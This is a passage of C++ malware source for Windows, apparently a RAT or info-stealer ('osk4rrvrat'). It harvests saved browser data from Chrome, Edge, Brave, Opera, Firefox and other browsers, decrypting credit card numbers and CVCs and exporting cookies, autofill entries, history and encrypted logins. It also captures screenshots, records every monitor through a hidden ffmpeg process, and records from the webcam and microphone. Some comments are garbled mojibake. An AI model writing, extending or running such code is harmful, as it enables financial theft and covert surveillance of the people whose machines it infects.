                if (api.prepare_v2(db, q, -1, &st, nullptr) == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        std::string name = sqlText(api, st, 0);
                        int month = api.column_int ? api.column_int(st, 1) : 0;
                        int year = api.column_int ? api.column_int(st, 2) : 0;
                        const void* blob = api.column_blob(st, 3);
                        int blen = api.column_bytes ? api.column_bytes(st, 3) : 0;
                        std::string number = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, false);
                        std::string nick = sqlText(api, st, 4);
                        txt << "Name: " << name << "\nNickname: " << nick
                            << "\nNumber: " << number
                            << "\nExp: " << month << "/" << year << "\n---\n";
                        count++;
                    }
                    api.finalize(st);
                }
                st = nullptr;
                if (api.prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &st, nullptr) == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        std::string guid = sqlText(api, st, 0);
                        const void* blob = api.column_blob(st, 1);
                        int blen = api.column_bytes ? api.column_bytes(st, 1) : 0;
                        std::string cvc = decryptChromiumValue(masterKey, appBoundKey, (const BYTE*)blob, blen, false);
                        if (!cvc.empty())
                            txt << "CVC guid=" << guid << " value=" << cvc << "\n";
                    }
                    api.finalize(st);
                }
                api.close(db);
            }
            DeleteFileA(tmp.c_str());
        }
        txt << "Total cards: " << count << "\n";
        std::string s = txt.str();
        out.push_back({ folder + "credit_cards.txt", std::vector<char>(s.begin(), s.end()) });
    }

    // --- Autofill ---
    {
        std::ostringstream txt;
        txt << "=== Autofill: " << browserName << " / " << profileName << " ===\n";
        int count = 0;
        std::string tmp = copyDb(profilePath + "\\Web Data");
        if (!tmp.empty()) {
            sqlite3* db = nullptr;
            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                sqlite3_stmt* st = nullptr;
                if (api.prepare_v2(db, "SELECT name, value FROM autofill LIMIT 2000", -1, &st, nullptr) == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        txt << sqlText(api, st, 0) << " = " << sqlText(api, st, 1) << "\n";
                        count++;
                    }
                    api.finalize(st);
                }
                api.close(db);
            }
            DeleteFileA(tmp.c_str());
        }
        txt << "Total autofill: " << count << "\n";
        std::string s = txt.str();
        out.push_back({ folder + "autofill.txt", std::vector<char>(s.begin(), s.end()) });
    }

    // --- History ---
    {
        std::ostringstream txt;
        txt << "=== History (recent): " << browserName << " / " << profileName << " ===\n";
        int count = 0;
        std::string tmp = copyDb(profilePath + "\\History");
        if (!tmp.empty()) {
            sqlite3* db = nullptr;
            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                sqlite3_stmt* st = nullptr;
                const char* q = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 500";
                if (api.prepare_v2(db, q, -1, &st, nullptr) == SQLITE_OK && st) {
                    while (api.step(st) == SQLITE_ROW) {
                        int visits = api.column_int ? api.column_int(st, 2) : 0;
                        txt << "[" << visits << "] " << sqlText(api, st, 1) << "\n  " << sqlText(api, st, 0) << "\n";
                        count++;
                    }
                    api.finalize(st);
                }
                api.close(db);
            }
            DeleteFileA(tmp.c_str());
        }
        txt << "Total history rows: " << count << "\n";
        std::string s = txt.str();
        out.push_back({ folder + "history.txt", std::vector<char>(s.begin(), s.end()) });
    }
}

struct BrowserInstall {
    std::string name;
    std::string userDataRoot;
    bool isFirefox = false;
};

static std::vector<BrowserInstall> detectAllBrowsers() {
    char localAppData[MAX_PATH] = {};
    char roamingAppData[MAX_PATH] = {};
    SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData);
    SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, roamingAppData);

    std::vector<BrowserInstall> list;
    auto addIf = [&](const std::string& name, const std::string& root, bool fx = false) {
        if (pathExists(root))
            list.push_back({ name, root, fx });
    };
    addIf("Chrome", std::string(localAppData) + "\\Google\\Chrome\\User Data");
    addIf("Chrome Beta", std::string(localAppData) + "\\Google\\Chrome Beta\\User Data");
    addIf("Edge", std::string(localAppData) + "\\Microsoft\\Edge\\User Data");
    addIf("Brave", std::string(localAppData) + "\\BraveSoftware\\Brave-Browser\\User Data");
    addIf("Opera GX", firstExistingPath({
        std::string(roamingAppData) + "\\Opera Software\\Opera GX Stable",
        std::string(localAppData) + "\\Opera Software\\Opera GX Stable"
    }));
    addIf("Opera", firstExistingPath({
        std::string(roamingAppData) + "\\Opera Software\\Opera Stable",
        std::string(localAppData) + "\\Opera Software\\Opera Stable"
    }));
    addIf("Vivaldi", std::string(localAppData) + "\\Vivaldi\\User Data");
    addIf("Yandex", std::string(localAppData) + "\\Yandex\\YandexBrowser\\User Data");
    addIf("Firefox", std::string(roamingAppData) + "\\Mozilla\\Firefox\\Profiles", true);
    return list;
}

static std::vector<std::string> listChromiumProfiles(const std::string& userDataRoot) {
    std::vector<std::string> profiles;
    // Default first
    if (pathExists(userDataRoot + "\\Default"))
        profiles.push_back("Default");
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA((userDataRoot + "\\*").c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            std::string n = fd.cFileName;
            if (n == "." || n == ".." || n == "Default" || n == "System Profile" || n == "Guest Profile") continue;
            // Profile N or custom
            if (n.rfind("Profile", 0) == 0 || pathExists(userDataRoot + "\\" + n + "\\Preferences"))
                profiles.push_back(n);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    if (profiles.empty() && pathExists(userDataRoot))
        profiles.push_back("."); // root is profile (rare)
    return profiles;
}

static std::vector<std::pair<std::string, std::vector<char>>> grabBrowserDataFiles() {
    std::vector<std::pair<std::string, std::vector<char>>> result;
    auto browsers = detectAllBrowsers();
    std::string defaultBrowser = getDefaultBrowserName();

    for (const auto& b : browsers) {
        if (b.isFirefox) {
            WIN32_FIND_DATAA findData;
            HANDLE hFind = FindFirstFileA((b.userDataRoot + "\\*").c_str(), &findData);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || findData.cFileName[0] == '.')
                        continue;
                    std::string profilePath = b.userDataRoot + "\\" + findData.cFileName;
                    std::string folder = "browser_data/Firefox/" + sanitizeFolderName(findData.cFileName) + "/";
                    auto& api = sqliteApi();
                    // cookies as text
                    if (api.ok()) {
                        std::string tmp = getTempDir() + "ffc_" + std::to_string(GetTickCount64()) + ".db";
                        if (copyFileWithRetry(profilePath + "\\cookies.sqlite", tmp)) {
                            sqlite3* db = nullptr;
                            std::ostringstream txt;
                            txt << "=== Firefox Cookies: " << findData.cFileName << " ===\n";
                            int count = 0;
                            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                                sqlite3_stmt* st = nullptr;
                                if (api.prepare_v2(db,
                                    "SELECT host, name, value, path, isSecure FROM moz_cookies",
                                    -1, &st, nullptr) == SQLITE_OK && st) {
                                    while (api.step(st) == SQLITE_ROW) {
                                        txt << sqlText(api, st, 0) << "\t" << sqlText(api, st, 1) << "\t"
                                            << sqlText(api, st, 2) << "\t" << sqlText(api, st, 3) << "\n";
                                        count++;
                                    }
                                    api.finalize(st);
                                }
                                api.close(db);
                            }
                            DeleteFileA(tmp.c_str());
                            txt << "Total: " << count << "\n";
                            std::string s = txt.str();
                            result.push_back({ folder + "cookies.txt", std::vector<char>(s.begin(), s.end()) });
                        }
                        // history
                        tmp = getTempDir() + "ffh_" + std::to_string(GetTickCount64()) + ".db";
                        if (copyFileWithRetry(profilePath + "\\places.sqlite", tmp)) {
                            sqlite3* db = nullptr;
                            std::ostringstream txt;
                            txt << "=== Firefox History: " << findData.cFileName << " ===\n";
                            int count = 0;
                            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READWRITE, nullptr) == SQLITE_OK && db) {
                                sqlite3_stmt* st = nullptr;
                                if (api.prepare_v2(db,
                                    "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 500",
                                    -1, &st, nullptr) == SQLITE_OK && st) {
                                    while (api.step(st) == SQLITE_ROW) {
                                        txt << sqlText(api, st, 1) << "\n  " << sqlText(api, st, 0) << "\n";
                                        count++;
                                    }
                                    api.finalize(st);
                                }
                                api.close(db);
                            }
                            DeleteFileA(tmp.c_str());
                            txt << "Total: " << count << "\n";
                            std::string s = txt.str();
                            result.push_back({ folder + "history.txt", std::vector<char>(s.begin(), s.end()) });
                        }
                    }
                    // logins.json is JSON (still NSS-encrypted passwords) Ä‚â€žĂ˘â‚¬ĹˇÄ‚â€ąĂ‚ÂĂ„â€šĂ‹ÂÄ‚ËĂ˘â€šÂ¬ÄąË‡Ä‚â€šĂ‚Â¬Ă„â€šĂ‹ÂÄ‚ËĂ˘â‚¬ĹˇĂ‚Â¬Ă„Ä…Ă„â€ž include as text note
                    std::string loginsPath = profilePath + "\\logins.json";
                    if (pathExists(loginsPath)) {
                        std::string tmp = getTempDir() + "ffl_" + std::to_string(GetTickCount()) + ".json";
                        if (copyFileWithRetry(loginsPath, tmp)) {
                            auto data = readFileToVector(tmp);
                            DeleteFileA(tmp.c_str());
                            if (!data.empty())
                                result.push_back({ folder + "logins_encrypted.json", std::move(data) });
                        }
                    }
                    std::string note = "Firefox passwords in logins_encrypted.json are NSS-encrypted (need key4.db + master password).\nCookies/history exported as plain text.\n";
                    result.push_back({ folder + "README.txt", std::vector<char>(note.begin(), note.end()) });
                } while (FindNextFileA(hFind, &findData));
                FindClose(hFind);
            }
            continue;
        }

        auto profiles = listChromiumProfiles(b.userDataRoot);
        for (const auto& prof : profiles) {
            std::string profilePath = (prof == ".") ? b.userDataRoot : (b.userDataRoot + "\\" + prof);
            // Readable TXT only Ä‚â€žĂ˘â‚¬ĹˇÄ‚â€ąĂ‚ÂĂ„â€šĂ‹ÂÄ‚ËĂ˘â€šÂ¬ÄąË‡Ä‚â€šĂ‚Â¬Ă„â€šĂ‹ÂÄ‚ËĂ˘â‚¬ĹˇĂ‚Â¬Ă„Ä…Ă„â€ž no raw SQLite dumps
            exportChromiumReadable(b.name, prof == "." ? "Root" : prof, profilePath, b.userDataRoot, result);

            std::string bm = profilePath + "\\Bookmarks";
            if (pathExists(bm)) {
                std::string tmp = getTempDir() + "bm_" + std::to_string(GetTickCount()) + ".json";
                if (copyFileWithRetry(bm, tmp)) {
                    auto data = readFileToVector(tmp);
                    DeleteFileA(tmp.c_str());
                    if (!data.empty()) {
                        std::string folder = "browser_data/" + sanitizeFolderName(b.name) + "/" +
                            sanitizeFolderName(prof == "." ? "Root" : prof) + "/";
                        result.push_back({ folder + "bookmarks.json", std::move(data) });
                    }
                }
            }
        }
    }

    std::ostringstream summary;
    summary << "=== Browser Data Summary ===\n";
    summary << "Default browser (registry): " << defaultBrowser << "\n";
    summary << "Detected browsers: " << browsers.size() << "\n";
    summary << "winsqlite3: " << (sqliteApi().ok() ? "OK" : "MISSING") << "\n";
    summary << "Format: readable TXT only (no SQLite dumps)\n\n";
    for (const auto& b : browsers) {
        summary << "- " << b.name << " @ " << b.userDataRoot << "\n";
        if (!b.isFirefox) {
            auto profiles = listChromiumProfiles(b.userDataRoot);
            for (const auto& p : profiles)
                summary << "    profile: " << p << "\n";
            auto mk = getChromiumMasterKey(b.userDataRoot);
            summary << "    master_key: " << (mk.empty() ? "FAIL" : ("OK (" + std::to_string(mk.size()) + " bytes)")) << "\n";
        }
    }
    summary << "\nExported files: " << result.size() << "\n";
    std::string s = summary.str();
    result.push_back({ "browser_data/browser_summary.txt", std::vector<char>(s.begin(), s.end()) });
    return result;
}

static std::string grabBrowserDataSummary() {
    // kept for compatibility Ä‚â€žĂ˘â‚¬ĹˇÄ‚â€ąĂ‚ÂĂ„â€šĂ‹ÂÄ‚ËĂ˘â€šÂ¬ÄąË‡Ä‚â€šĂ‚Â¬Ă„â€šĂ‹ÂÄ‚ËĂ˘â‚¬ĹˇĂ‚Â¬Ă„Ä…Ă„â€ž full summary is produced inside grabBrowserDataFiles
    auto browsers = detectAllBrowsers();
    std::ostringstream result;
    result << "=== Browser Data ===\n";
    result << "Default browser: " << getDefaultBrowserName() << "\n";
    result << "Detected: " << browsers.size() << "\n";
    for (const auto& b : browsers)
        result << "- " << b.name << " => " << b.userDataRoot << "\n";
    return result.str();
}

// === Feature: Screenshot ===

static int getEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    std::vector<BYTE> buffer(size);
    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)buffer.data();
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[i].Clsid;
            return (int)i;
        }
    }
    return -1;
}

static std::vector<char> captureScreenshot() {
    std::vector<char> result;

    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken = 0;
    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr) != Gdiplus::Ok)
        return result;

    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    if (width <= 0 || height <= 0) {
        width = GetSystemMetrics(SM_CXSCREEN);
        height = GetSystemMetrics(SM_CYSCREEN);
        x = 0;
        y = 0;
    }

    HDC hScreen = GetDC(nullptr);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    HGDIOBJ oldObj = SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, x, y, SRCCOPY | CAPTUREBLT);
    SelectObject(hDC, oldObj);

    IStream* stream = nullptr;
    if (CreateStreamOnHGlobal(nullptr, TRUE, &stream) != S_OK || !stream) {
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;
    }

    Gdiplus::Bitmap* bitmap = Gdiplus::Bitmap::FromHBITMAP(hBitmap, nullptr);
    if (!bitmap) {
        stream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;
    }

    CLSID clsidPng;
    if (getEncoderClsid(L"image/png", &clsidPng) < 0) {
        delete bitmap;
        stream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;
    }

    if (bitmap->Save(stream, &clsidPng, nullptr) != Gdiplus::Ok) {
        delete bitmap;
        stream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hDC);
        ReleaseDC(nullptr, hScreen);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return result;
    }

    // Seek stream to start and read all bytes (GlobalSize can over-report)
    LARGE_INTEGER zero = {};
    ULARGE_INTEGER streamSize = {};
    stream->Seek(zero, STREAM_SEEK_END, &streamSize);
    stream->Seek(zero, STREAM_SEEK_SET, nullptr);

    ULONG toRead = (ULONG)streamSize.QuadPart;
    if (toRead > 0) {
        result.resize(toRead);
        ULONG bytesRead = 0;
        stream->Read(result.data(), toRead, &bytesRead);
        result.resize(bytesRead);
    }

    delete bitmap;
    stream->Release();
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(nullptr, hScreen);
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return result;
}

// === Capture helpers: ffmpeg + waveIn stereo + result dump ===

static std::string getWorkspaceResultDir() {
    return "C:\\Users\\oziet\\Downloads\\osk4rrvrat\\result";
}

static void ensureDir(const std::string& path) {
    SHCreateDirectoryExA(nullptr, path.c_str(), nullptr);
}

static void dumpToResult(const std::string& relPath, const std::vector<char>& data) {
    if (data.empty()) return;
    std::string full = getWorkspaceResultDir() + "\\" + relPath;
    for (char& c : full) if (c == '/') c = '\\';
    size_t slash = full.rfind('\\');
    if (slash != std::string::npos)
        ensureDir(full.substr(0, slash));
    writeVectorToFile(full, data);
}

static void clearResultDir() {
    std::string root = getWorkspaceResultDir();
    ensureDir(root);
    deleteTree(root);
    ensureDir(root);
    ensureDir(root + "\\browser_data");
    ensureDir(root + "\\screenshot");
    ensureDir(root + "\\screen");
    ensureDir(root + "\\webcam");
    ensureDir(root + "\\audio");
}

static std::string findFfmpeg() {
    static std::string cached;
    if (!cached.empty()) return cached;

    const char* candidates[] = {
        "C:\\Program Files\\Shotcut\\ffmpeg.exe",
        "C:\\Program Files\\SteelSeries\\GG\\apps\\moments\\ffmpeg.exe",
        "C:\\ffmpeg\\bin\\ffmpeg.exe",
        "C:\\Program Files\\ffmpeg\\bin\\ffmpeg.exe",
        "ffmpeg.exe"
    };
    for (const char* c : candidates) {
        if (GetFileAttributesA(c) != INVALID_FILE_ATTRIBUTES) {
            cached = c;
            return cached;
        }
    }

    // PATH lookup
    char pathBuf[MAX_PATH] = {};
    if (SearchPathA(nullptr, "ffmpeg.exe", nullptr, MAX_PATH, pathBuf, nullptr)) {
        cached = pathBuf;
        return cached;
    }
    return {};
}

static std::string quoteArg(const std::string& s) {
    return "\"" + s + "\"";
}

static bool runFfmpeg(const std::string& args, DWORD timeoutMs = 60000) {
    std::string ff = findFfmpeg();
    if (ff.empty()) return false;
    std::string cmd = quoteArg(ff) + " -hide_banner -loglevel error -y " + args;

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    char* cmdCopy = _strdup(cmd.c_str());
    BOOL ok = CreateProcessA(nullptr, cmdCopy, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    free(cmdCopy);
    if (!ok) return false;

    DWORD wait = WaitForSingleObject(pi.hProcess, timeoutMs);
    if (wait == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return false;
    }
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return code == 0;
}

static std::string captureFfmpegDeviceList() {
    std::string ff = findFfmpeg();
    if (ff.empty()) return {};

    SECURITY_ATTRIBUTES sa = {};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return {};
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    PROCESS_INFORMATION pi = {};

    std::string cmd = quoteArg(ff) + " -hide_banner -list_devices true -f dshow -i dummy";
    char* cmdCopy = _strdup(cmd.c_str());
    BOOL ok = CreateProcessA(nullptr, cmdCopy, nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    free(cmdCopy);
    CloseHandle(hWrite);
    if (!ok) {
        CloseHandle(hRead);
        return {};
    }

    std::string output;
    char buf[1024];
    DWORD read = 0;
    while (ReadFile(hRead, buf, sizeof(buf) - 1, &read, nullptr) && read > 0) {
        buf[read] = 0;
        output += buf;
    }
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return output;
}

static std::vector<std::string> parseDshowNames(const std::string& listOut, const char* kind) {
    // kind = "(video)" or "(audio)"
    std::vector<std::string> names;
    std::istringstream iss(listOut);
    std::string line;
    while (std::getline(iss, line)) {
        if (line.find(kind) == std::string::npos) continue;
        size_t q1 = line.find('"');
        if (q1 == std::string::npos) continue;
        size_t q2 = line.find('"', q1 + 1);
        if (q2 == std::string::npos) continue;
        names.push_back(line.substr(q1 + 1, q2 - q1 - 1));
    }
    return names;
}

static std::string pickPreferredAudioDevice(const std::vector<std::string>& devices) {
    if (devices.empty()) return {};
    // Prefer non-webcam mics first (PRO, Realtek, etc.)
    for (const auto& d : devices) {
        std::string low = d;
        std::transform(low.begin(), low.end(), low.begin(), ::tolower);
        if (low.find("webcam") == std::string::npos && low.find("camera") == std::string::npos &&
            low.find("c270") == std::string::npos)
            return d;
    }
    return devices.front();
}

static std::string pickPreferredVideoDevice(const std::vector<std::string>& devices) {
    if (devices.empty()) return {};
    for (const auto& d : devices) {
        std::string low = d;
        std::transform(low.begin(), low.end(), low.begin(), ::tolower);
        if (low.find("c270") != std::string::npos || low.find("logi") != std::string::npos ||
            low.find("webcam") != std::string::npos || low.find("camera") != std::string::npos)
            return d;
    }
    return devices.front();
}
// === Feature: Webcam MP4 via ffmpeg dshow ===

static std::vector<std::pair<std::string, std::vector<char>>> captureWebcamVfwFallback() {
    std::vector<std::pair<std::string, std::vector<char>>> result;
    // Visible popup so camera LED/driver actually engages
    HWND hWnd = CreateWindowExA(
        WS_EX_TOOLWINDOW, "STATIC", "Camera",
        WS_POPUP | WS_VISIBLE,
        -32000, -32000, 640, 480,
        nullptr, nullptr, GetModuleHandleA(nullptr), nullptr);
    if (!hWnd) return result;

    HWND capWnd = capCreateCaptureWindowA(
        "CaptureWindow", WS_CHILD | WS_VISIBLE, 0, 0, 640, 480, hWnd, 1);
    if (!capWnd) {
        DestroyWindow(hWnd);
        return result;
    }

    bool connected = false;
    for (int d = 0; d < 10; d++) {
        if (capDriverConnect(capWnd, d)) {
            connected = true;
            break;
        }
    }
    if (connected) {
        capPreviewRate(capWnd, 66);
        capPreview(capWnd, TRUE);
        // Keep driver open long enough for LED + a few frames
        Sleep(2500);
        std::string bmp = getTempDir() + "webcam_fb.bmp";
        if (capFileSaveDIB(capWnd, bmp.c_str())) {
            auto data = readFileToVector(bmp);
            if (!data.empty())
                result.push_back({ "webcam/frame_fallback.bmp", std::move(data) });
            DeleteFileA(bmp.c_str());
        }
        // Second frame a moment later
        Sleep(500);
        std::string bmp2 = getTempDir() + "webcam_fb2.bmp";
        if (capFileSaveDIB(capWnd, bmp2.c_str())) {
            auto data = readFileToVector(bmp2);
            if (!data.empty())
                result.push_back({ "webcam/frame_fallback2.bmp", std::move(data) });
            DeleteFileA(bmp2.c_str());
        }
        capPreview(capWnd, FALSE);
        capDriverDisconnect(capWnd);
    }
    DestroyWindow(capWnd);
    DestroyWindow(hWnd);
    return result;
}

static std::vector<std::pair<std::string, std::vector<char>>> captureWebcam(int durationSec) {
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 600) durationSec = 600;
    DWORD timeoutMs = (DWORD)durationSec * 1000 + 45000;

    std::vector<std::pair<std::string, std::vector<char>>> result;
    std::string list = captureFfmpegDeviceList();
    auto videos = parseDshowNames(list, "(video)");
    std::string cam = pickPreferredVideoDevice(videos);

    if (!cam.empty() && !findFfmpeg().empty()) {
        std::string outPath = getTempDir() + "webcam_" + std::to_string(GetTickCount()) + ".mp4";
        std::string tArg = " -t " + std::to_string(durationSec) + " ";
        // Real dshow open turns camera LED on
        std::string args = "-f dshow -rtbufsize 100M -framerate 15 -video_size 640x480 -i video=" + quoteArg(cam) +
            tArg + "-c:v libx264 -preset ultrafast -pix_fmt yuv420p -an " + quoteArg(outPath);
        if (!runFfmpeg(args, timeoutMs)) {
            args = "-f dshow -rtbufsize 100M -i video=" + quoteArg(cam) +
                tArg + "-c:v mpeg4 -q:v 5 -an " + quoteArg(outPath);
            runFfmpeg(args, timeoutMs);
        }

        auto data = readFileToVector(outPath);
        DeleteFileA(outPath.c_str());
        if (!data.empty()) {
            result.push_back({ "webcam/webcam.mp4", std::move(data) });
            return result;
        }
    }

    // Always try VFW if ffmpeg path failed — engages camera driver visibly
    auto fb = captureWebcamVfwFallback();
    result.insert(result.end(), fb.begin(), fb.end());
    return result;
}

// === Feature: Screen recording MP4 - one file per monitor ===

struct MonitorInfo {
    int index;
    int x, y, w, h;
    bool primary;
};

static BOOL CALLBACK enumMonitorsProc(HMONITOR hMon, HDC, LPRECT, LPARAM lParam) {
    auto* list = (std::vector<MonitorInfo>*)lParam;
    MONITORINFO mi = {};
    mi.cbSize = sizeof(mi);
    if (!GetMonitorInfoA(hMon, &mi)) return TRUE;
    MonitorInfo m;
    m.index = (int)list->size();
    m.x = mi.rcMonitor.left;
    m.y = mi.rcMonitor.top;
    m.w = mi.rcMonitor.right - mi.rcMonitor.left;
    m.h = mi.rcMonitor.bottom - mi.rcMonitor.top;
    m.primary = (mi.dwFlags & MONITORINFOF_PRIMARY) != 0;
    list->push_back(m);
    return TRUE;
}

static std::vector<MonitorInfo> getAllMonitors() {
    std::vector<MonitorInfo> list;
    EnumDisplayMonitors(nullptr, nullptr, enumMonitorsProc, (LPARAM)&list);
    if (list.empty()) {
        MonitorInfo m{};
        m.index = 0;
        m.x = 0; m.y = 0;
        m.w = GetSystemMetrics(SM_CXSCREEN);
        m.h = GetSystemMetrics(SM_CYSCREEN);
        m.primary = true;
        list.push_back(m);
    }
    return list;
}

static std::vector<std::pair<std::string, std::vector<char>>> recordScreen(int durationSec) {
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 600) durationSec = 600;
    DWORD timeoutMs = (DWORD)durationSec * 1000 + 30000;
    std::string tArg = " -t " + std::to_string(durationSec) + " ";

    std::vector<std::pair<std::string, std::vector<char>>> result;
    auto monitors = getAllMonitors();

    if (findFfmpeg().empty()) {
        auto frame = captureScreenshot();
        if (!frame.empty())
            result.push_back({ "screen/screenshot_fallback.png", std::move(frame) });
        return result;
    }

    for (const auto& mon : monitors) {
        std::string tag = "mon" + std::to_string(mon.index) + (mon.primary ? "_primary" : "");
        std::string outPath = getTempDir() + "screen_" + tag + "_" + std::to_string(GetTickCount()) + ".mp4";
        std::string args = "-f gdigrab -framerate 12 -offset_x " + std::to_string(mon.x) +
            " -offset_y " + std::to_string(mon.y) +
            " -video_size " + std::to_string(mon.w) + "x" + std::to_string(mon.h) +
            tArg + "-i desktop -c:v libx264 -preset ultrafast -pix_fmt yuv420p -an " + quoteArg(outPath);
        if (!runFfmpeg(args, timeoutMs)) {
            args = "-f gdigrab -framerate 10 -offset_x " + std::to_string(mon.x) +
                " -offset_y " + std::to_string(mon.y) +
                " -video_size " + std::to_string(mon.w) + "x" + std::to_string(mon.h) +
                tArg + "-i desktop -c:v mpeg4 -q:v 5 -an " + quoteArg(outPath);
            runFfmpeg(args, timeoutMs);
        }
        auto data = readFileToVector(outPath);
        DeleteFileA(outPath.c_str());
        if (!data.empty())
            result.push_back({ "screen/" + tag + ".mp4", std::move(data) });
    }

    if (monitors.size() > 1) {
        std::string outPath = getTempDir() + "screen_all_" + std::to_string(GetTickCount()) + ".mp4";
        std::string args = "-f gdigrab -framerate 10" + tArg + "-i desktop -c:v libx264 -preset ultrafast -pix_fmt yuv420p -an " + quoteArg(outPath);
        if (!runFfmpeg(args, timeoutMs)) {
            args = "-f gdigrab -framerate 10" + tArg + "-i desktop -c:v mpeg4 -q:v 5 -an " + quoteArg(outPath);
            runFfmpeg(args, timeoutMs);
        }
        auto data = readFileToVector(outPath);
        DeleteFileA(outPath.c_str());
        if (!data.empty())
            result.push_back({ "screen/all_monitors.mp4", std::move(data) });
    }

    return result;
}

// === Feature: Microphone Ä‚â€žĂ˘â‚¬ĹˇÄ‚â€ąĂ‚ÂĂ„â€šĂ‹ÂÄ‚ËĂ˘â€šÂ¬ÄąË‡Ä‚â€šĂ‚Â¬Ă„â€šĂ‹ÂÄ‚ËĂ˘â‚¬ĹˇĂ‚Â¬Ă„Ä…Ă„â€ž stereo waveIn + ffmpeg dshow fallback ===

static std::vector<char> buildWavStereo(const std::vector<char>& pcm, DWORD sampleRate, WORD channels, WORD bits) {
    std::vector<char> wav;
    DWORD dataLen = (DWORD)pcm.size();
    DWORD chunkSize = 36 + dataLen;
    DWORD fmtSize = 16;
    WORD audioFmt = 1;
    WORD blockAlign = (WORD)(channels * bits / 8);
    DWORD byteRate = sampleRate * blockAlign;

    wav.insert(wav.end(), "RIFF", "RIFF" + 4);
    wav.insert(wav.end(), (char*)&chunkSize, (char*)&chunkSize + 4);
    wav.insert(wav.end(), "WAVE", "WAVE" + 4);
    wav.insert(wav.end(), "fmt ", "fmt " + 4);
    wav.insert(wav.end(), (char*)&fmtSize, (char*)&fmtSize + 4);
    wav.insert(wav.end(), (char*)&audioFmt, (char*)&audioFmt + 2);
    wav.insert(wav.end(), (char*)&channels, (char*)&channels + 2);
    wav.insert(wav.end(), (char*)&sampleRate, (char*)&sampleRate + 4);
    wav.insert(wav.end(), (char*)&byteRate, (char*)&byteRate + 4);
    wav.insert(wav.end(), (char*)&blockAlign, (char*)&blockAlign + 2);
    wav.insert(wav.end(), (char*)&bits, (char*)&bits + 2);
    wav.insert(wav.end(), "data", "data" + 4);
    wav.insert(wav.end(), (char*)&dataLen, (char*)&dataLen + 4);
    wav.insert(wav.end(), pcm.begin(), pcm.end());
    return wav;
}

static bool pcmHasSignal(const std::vector<char>& pcm) {
    if (pcm.size() < 4) return false;
    size_t samples = pcm.size() / 2;
